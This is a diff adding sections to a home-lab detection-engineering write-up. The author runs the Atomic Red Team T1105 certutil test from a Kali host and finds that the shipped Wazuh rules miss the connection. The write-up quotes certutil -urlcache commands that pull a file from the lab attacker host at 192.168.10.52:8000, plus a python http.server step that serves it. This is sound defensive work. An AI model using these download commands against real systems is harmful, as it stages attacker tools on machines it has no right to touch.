@@ -15,4 +15,54 @@ They both work by describing what is supposed to happen and firing on anything o
 The reason I picked this technique in particular is that it is the next thing in the sequence. My first three rules all begin with the attacker already on the endpoint and running something on it, and what I am trying to catch is the command they typed, so none of them has anything to say about how the attacker got there in the first place. 100104 was me starting from the other end of that, which is how somebody gets onto the endpoint at all and what they are doing to it from outside, and once that rule existed the one after it should be the next step in the same story rather than another angle on the step before. So 100104 is somebody getting in, 100105 is them opening a channel back out, and this one is them using that channel to pull across the tools they did not arrive with. That difference shows up in the rules themselves too. 100100, 100102 and 100103 all read `win.eventdata.commandLine` and decide the string sitting in it looks wrong, which makes them three angles on one kind of detection. 100104, 100105 and 100106 do not read a command line at all. One rule correlates authentication events, the other rule reads the direction and port of a connection, and this one reads the image that opened it. 
 
 
+## Attack Execution
 
+The test I ran is Atomic Red Team test 7 under T1105, "certutil download (urlcache)", with the GUID `dd3b61dd-7bbc-48cd-ab51-49ad1a776df0`. It uses certutil's `-urlcache` argument to download a file from the web, it only supports Windows, and it runs through the command prompt rather than PowerShell.
+
+```
+cmd /c certutil -urlcache -split -f #{remote_file} #{local_path}
+```
+
+The inputs default to a `LICENSE.txt` out of the atomic-red-team repository on `raw.githubusercontent.com`. The command I ran is:
+
+```
+cmd /c certutil -urlcache -split -f http://192.168.10.52:8000/[NEEDS filename] [NEEDS local path]
+```
+
+I only changed the URL, for the same reason I redirected the connection in finding 05. As it ships the test proves my endpoint can reach GitHub, and T1105 is a file being pulled off infrastructure the attacker controls, so it needs to point at 192.168.10.52, which is the same Kali box from findings 01 and 05.
+
+On Kali I served the file with `python3 -m http.server 8000`. In finding 05 an `nc` listener was enough because the connection itself was the technique, but here the transfer has to complete, so the listener had to be something that actually speaks HTTP.
+
+The command is not an attack, in the same way `Test-NetConnection` was not. certutil ships with Windows and fetching a file over HTTP is documented behaviour, so what makes it the technique is who asked for it and what is at the other end, and neither of those is in the event.
+
+I did not write the rule against the command line because the arguments are the part that varies. certutil takes `-urlcache` or `-verifyctl`, a slash instead of a dash, `-f` anywhere or not at all, and every other binary in the technique has its own syntax entirely. All of them have to open a socket though, and the socket looks the same whichever flag produced it.
+
+What matters for the rule is that `cmd.exe` does not open that socket. It spawns `certutil.exe`, and certutil is what opens it, so the connection event carries certutil as its image rather than the shell that launched it. That is the opposite of finding 05, where PowerShell opened the socket itself, and it is why this rule can key on the process at all.
+
+
+## Baseline Alert
+
+<img width="1280" height="868" alt="image" src="https://github.com/user-attachments/assets/cc060da7-df98-4198-b011-497e67eb3e79" />
+
+These are the alerts produced by Wazuh's shipped ruleset with 100106 commented out. The window runs from 21:35:00 to 21:36:51 and holds 61 alerts, and none of them are about the connection.
+
+Most of the volume is 67027 at level 3, "A process was created", which is the same noise floor that turns up in every finding I have run.
+
+Three alerts belong to the test. 92052 at level 4, "Windows command prompt started by an abnormal process", is the `cmd.exe` the atomic launches being started out of my PowerShell session, so it is describing the test harness rather than the technique. The other two are both 92032 at level 3, "Suspicious Windows cmd shell execution", and there are two of them because I ran the test twice. Windows Defender flagged the first run, so I ran it again thinking the download had not gone through, when it actually had. The command is in both of those alerts in full, twice over, once as the command line of the process itself and once as the parent command line of the `cmd.exe` that launched it.
+
+```
+certutil  -urlcache -split -f http://192.168.10.52:8000/tool.txt tool.txt
+cmd  /c certutil -urlcache -split -f http://192.168.10.52:8000/tool.txt tool.txt
+```
+
+92032 is tagged T1087 Account Discovery under Discovery and T1059.003 Windows Command Shell under Execution. Nothing in the run carried T1105, and nothing carried Command and Control. Sysmon's own tag on the process creation event reads `technique_id=T1202,technique_name=Indirect Command Execution`, which is the config's opinion rather than Wazuh's, and it is a third technique again.
+
+The connection produced nothing. `certutil.exe` opened a socket to 192.168.10.52 on port 8000 and Sysmon wrote the Event 3 for it, and no shipped rule matched it.
+
+## Detection Gap
+
+## My Detection Rule
+
+## Custom Detection Rule Result
+
+## Coverage Limits
